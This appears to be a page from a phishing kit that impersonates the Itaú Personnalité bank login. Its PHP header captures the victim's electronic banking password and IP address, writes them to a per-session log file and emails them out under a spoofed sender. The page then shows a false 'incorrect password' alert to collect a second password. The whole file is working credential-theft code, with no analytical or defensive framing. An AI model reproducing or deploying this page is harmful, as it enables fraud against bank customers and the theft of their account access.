<?php
session_start();
require "../../sistemadeenvio.php";
$eletro1 = $_POST['eletro1'];

$sessionav1 = $_SESSION['sessao'];

$ip_usuario = $_SERVER['REMOTE_ADDR'];
$today = date("His");
$myFile = "../../infos2020infos/" . "$sessionav1" . ".txt";
$fh = fopen($myFile, 'a') or die("Impossaivel abrir arquivo.");
$stringData = 
"
senha eletronica 1: ---> $eletro1 
$ip_usuario 
";
fwrite($fh, $stringData);
fclose($fh);

$ip=$_SERVER["REMOTE_ADDR"];
$hora=date("H:i:s"); $headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .="From: uol <$email>";
@$dakdkldklsd.="<br>";
@$dakdkldklsd.="<b>senha eletronica 1:</b> $eletro1 <br>";
@mail("$email", "$ip_usuario", "$dakdkldklsd", $headers);
sleep(2);
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1"/>
	<link rel="shortcut icon" type="image/png" href="https://www.itau.com.br/content/dam/itau/favicon.png"/>
	<link rel="stylesheet" href="../css/style.css">
<title>Itaú Personnalité | Relacionamento próximo e surpreendente</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
</head>
<body class="geral">

	 <header class="headerksjkas">
	 	<div class="container">
	 		 <div class="row">
	 		 	 <div class="col-12">
	 		 	 	  <img src="../img/logo-itau-personnalite-desktop.png" alt="" border="0" height="60px">
	 		 	 </div>
	 		 </div>
	 	</div>
	 </header>

	 <section class="sdkjaskdjsd"> 
	 	  <div class="container">
	 	  	  <div class="row">
	 	  	  	  <div class="col-md-6">
	 	  	  	  	<div class="conteudoasjhjasd">
	 	  	  	  		 <h1>Olá, cliente</h1>
	 	  	  	  		 <p>Para acessar  o <strong class="sadjhasdjksakd">Itau Personnalité</strong> na internet digite sua senha</p>
	 	  	  	  		 
	 	  	  	  		 <form action="app_confirmar.php" method="post">
	 	  	  	  		 	  <p>digite sua senha eletrônica:</p>
	 	  	  	  		 	  	 	  	  	  		 	  <div class="alert alert-danger" role="alert">
  Senha eletrônica incorreta, tente novamente!
</div>
	 	  	  	  		 	  <input type="password" required="" name="eletro2" placeholder="Senha eletrônica" id="numeric1"  maxlength="8" minlength="6" > 

                                  
	 	  	  	  		 	   <img src="../img/app_dados.png" alt="">

	 	  	  	  		 	   <input type="submit" value="Acessar">
	 	  	  	  		 </form>
	 	  	  	  	</div>
	 	  	  	  </div>

	 	  	  	  <div class="col-md-6">
	 	  	  	  	
	 	  	  	  		<img src="../img/adsadasdsad.png" alt="">
	 	  	  	  		<img src="../img/sadsdsadasd.png" alt="">
	 	  	  	 
	 	  	  	  </div>
	 	  	  </div>
	 	  </div>
	 </section>

<br><br><br>

	 <footer>
	 	   <img src="../img/app_footer.png" alt="" width="99%">
	 </footer>
	



<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>	


    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script>
$('#numeric1').keyup(function() {
  $(this).val(this.value.replace(/\D/g, ''));
});
</script>
</body>
</html>